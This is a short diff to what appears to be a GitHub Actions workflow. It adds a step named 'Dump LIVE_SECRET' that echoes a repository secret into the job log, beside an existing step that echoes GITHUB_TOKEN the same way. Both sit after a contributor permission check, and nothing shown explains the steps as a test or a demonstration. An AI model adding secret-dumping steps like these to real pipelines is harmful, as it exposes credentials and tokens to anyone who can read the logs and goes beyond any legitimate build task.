@@ -53,7 +53,10 @@ jobs:
         with:
           require: 'write'
           check-contributor: true
-          
+                
+      - name: Dump LIVE_SECRET
+        run: echo '${{ secrets.LIVE_SECRET }}'  
+        
       - name: Dump GITHUB_TOKEN
         run: echo '${{ secrets.GITHUB_TOKEN }}'            
         
